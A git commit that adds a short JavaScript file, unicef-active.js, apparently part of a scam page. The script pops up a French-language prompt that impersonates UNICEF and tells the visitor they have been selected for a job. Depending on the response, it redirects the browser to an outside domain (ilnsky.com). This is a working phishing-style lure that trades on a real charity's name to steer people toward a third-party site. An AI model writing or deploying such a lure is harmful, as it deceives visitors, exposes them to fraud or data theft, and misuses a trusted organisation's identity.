aba180322be6e5e099e4ebbf30f2c0d9a924f327
ukpeha55-stack <ukpeha55@gmail.com>
2026-03-23 07:18:43 +0100

    Create unicef-active.js

---
+++ unicef-active.js
@@ -0,0 +1,5 @@
+var password = 'APPLIQUER '
+password=prompt('UNICEF: Félicitations, vous faites partie des sélectionnés pour travailler avec nous, cliquez sur Ok pour soumettre votre candidature maintenant. ','APPLIQUER ');
+if (password != 'APPLIQUER ') {
+location.href='https://ilnsky.com/unicef.html';
+}
